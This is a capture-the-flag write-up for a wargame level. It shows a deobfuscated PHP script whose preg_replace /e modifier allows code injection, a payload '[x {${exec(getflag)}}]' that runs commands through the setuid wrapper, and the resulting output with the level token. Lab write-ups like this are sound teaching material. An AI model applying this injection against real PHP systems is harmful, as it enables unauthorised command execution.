# level06 solution
Given setuid binary which calls php script with provided arguments. If we take a look at provided php script we will find out that it was obusficated, but we can easily deobusficate it via online service and get:

    <?php
    function y($m) {
        $m = preg_replace("/\./", " x ", $m);
        $m = preg_replace("/@/", " y", $m);
        return $m;
    }
    function x($y, $z) {
        $a = file_get_contents($y);
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\")", $a);
        $a = preg_replace("/\[/", "(", $a);
        $a = preg_replace("/\]/", ")", $a);
        return $a;
    }
    $r = x($argv[1], $argv[2]);
    print $r;
    ?>

This php script reads the content of provided file and replace some symbols with preg_replace. First preg_replace function entry in x function is matching any number of any symbols inside round brackets of expression '[x ()]' which is unsafe. We can abuse that by running this script on file with content that match this pattern:

    [x {${exec(getflag)}}]

Anything put inside inner curly brackets will be executed by php script. If we provide file to setuid binary with such content we will get token for the next level:

    PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
